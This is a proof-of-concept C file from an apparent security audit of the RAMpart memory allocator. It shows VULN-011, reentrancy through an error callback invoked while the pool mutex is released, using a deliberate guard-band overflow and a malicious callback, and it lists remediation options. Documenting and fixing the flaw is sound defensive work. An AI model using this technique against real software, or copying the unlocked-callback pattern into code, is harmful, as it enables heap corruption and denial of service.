/**
 * @file poc_11_reentrancy.c
 * @brief PoC for VULN-011: Reentrancy via Error Callback
 *
 * VULNERABILITY: Error callbacks are invoked with pool mutex released,
 *                allowing reentrant calls that corrupt internal state.
 *
 * CVSS 3.1: 7.0 (High)
 * CWE-662: Improper Synchronization
 *
 * IMPACT: Heap corruption, denial of service, potential code execution.
 *
 * LOCATION: src/rampart.c:56-75
 *
 * STATUS: FIXED - Pool mutex now remains locked during callback invocation.
 *         Reentrant calls from callbacks will deadlock instead of corrupting
 *         state. Documentation updated to warn that callbacks must not call
 *         RAMpart functions on the same pool.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

/*
 * Vulnerable code in invoke_callback():
 *
 * if (callback != NULL) {
 *     rp_pool_unlock(pool);    // Mutex released!
 *     callback(...);           // Callback runs without lock
 *     rp_pool_lock(pool);      // Re-acquired after
 * }
 *
 * During callback execution, the pool is unlocked.
 * If callback calls rampart_alloc/free on same pool,
 * it modifies free lists while the original operation
 * is mid-flight!
 */

static rampart_pool_t *g_pool = NULL;
static int g_reentry_attempted = 0;
static int g_reentry_success = 0;
static void *g_reentrant_alloc = NULL;

/* Malicious callback that re-enters RAMpart */
static void evil_callback(rampart_pool_t *pool,
                           rampart_error_t error,
                           void *block,
                           void *user_data) {
    (void)error;
    (void)block;
    (void)user_data;

    printf("[CALLBACK] Error callback invoked!\n");
    printf("[CALLBACK] Pool mutex is RELEASED at this point.\n");

    g_reentry_attempted = 1;

    /*
     * ATTACK: Call rampart_alloc from within callback.
     *
     * The original operation (e.g., rampart_free) is in progress.
     * It has:
     * 1. Validated the block
     * 2. Released the mutex for callback
     * 3. NOT YET returned block to free list
     *
     * Our allocation might:
     * - Modify the free list
     * - Return memory that overlaps with block being freed
     * - Corrupt internal accounting
     */

    printf("[CALLBACK] Attempting reentrant allocation...\n");

    g_reentrant_alloc = rampart_alloc(pool, 128);

    if (g_reentrant_alloc != NULL) {
        printf("[CALLBACK] Reentrant alloc succeeded: %p\n",
               g_reentrant_alloc);
        g_reentry_success = 1;
    } else {
        printf("[CALLBACK] Reentrant alloc failed.\n");
    }

    printf("[CALLBACK] Callback returning...\n");
}

int main(void) {
    rampart_config_t config;
    char *block;
    rampart_error_t err;

    printf("=== VULN-011: Reentrancy via Error Callback ===\n\n");

    /* Initialize pool with callback */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;
    config.error_callback = evil_callback;
    config.validate_on_free = 1;  /* Enable to trigger callback */

    g_pool = rampart_init(&config);
    if (g_pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Pool created with error callback registered.\n");

    /* Allocate a block */
    block = (char *)rampart_alloc(g_pool, 64);
    if (block == NULL) {
        printf("[!] Allocation failed\n");
        rampart_shutdown(g_pool);
        return 1;
    }

    printf("[*] Allocated block at: %p\n", (void *)block);

    /*
     * Corrupt the guard band to trigger error callback.
     * When rampart_free detects corruption:
     * 1. Invokes callback with mutex unlocked
     * 2. Callback re-enters rampart_alloc
     * 3. Pool state may become inconsistent
     */

    printf("\n[*] Corrupting guard band to trigger callback...\n");
    memset(block, 'X', 64 + 16);  /* Overflow into rear guard */

    printf("[*] Calling rampart_free (will detect corruption)...\n\n");

    err = rampart_free(g_pool, block);

    printf("\n[*] rampart_free returned: %s\n", rampart_error_string(err));

    printf("\n=== Results ===\n");
    printf("Reentry attempted: %s\n", g_reentry_attempted ? "YES" : "NO");
    printf("Reentry succeeded: %s\n", g_reentry_success ? "YES" : "NO");

    if (g_reentry_success) {
        printf("\n[VULNERABLE] Reentrant allocation succeeded!\n");
        printf("[!] Pool state may be corrupted.\n");
        printf("[!] Free list manipulation during free operation.\n");

        /* Free the reentrant allocation */
        if (g_reentrant_alloc) {
            rampart_free(g_pool, g_reentrant_alloc);
        }
    }

    /*
     * Potential consequences of reentrancy:
     *
     * 1. Double counting: allocation_count modified twice
     * 2. Free list corruption: block added/removed out of order
     * 3. Memory overlap: reentrant alloc returns memory being freed
     * 4. Use-after-free: if reentrant alloc gets the same block
     */

    printf("\n=== Reentrancy Impact Analysis ===\n");
    printf("During error callback, pool is unlocked.\n");
    printf("Reentrant operations can:\n");
    printf("  1. Modify free list while original op in progress\n");
    printf("  2. Cause double-counting of allocations\n");
    printf("  3. Return overlapping memory regions\n");
    printf("  4. Corrupt internal state\n");

    printf("\n[*] Note: Severity depends on timing and operations.\n");
    printf("    Some reentrancy may appear to work but cause\n");
    printf("    subtle corruption that manifests later.\n");

    rampart_shutdown(g_pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     *
     * Option 1: Keep mutex locked during callback
     *   - Requires recursive mutex
     *   - Document that callbacks must not call RAMpart
     *
     * Option 2: Detect reentrancy
     *   static __thread int in_callback = 0;
     *   if (in_callback) return RAMPART_ERR_INTERNAL;
     *   in_callback = 1;
     *   callback(...);
     *   in_callback = 0;
     *
     * Option 3: Queue callbacks for later delivery
     *   - Store error info in queue
     *   - Deliver callbacks after operation complete
     *   - Mutex released properly
     *
     * Option 4: Copy all needed state before releasing mutex
     *   - Take snapshot of pool state
     *   - Release mutex
     *   - Call callback
     *   - Revalidate state after reacquiring mutex
     */

    return 0;
}
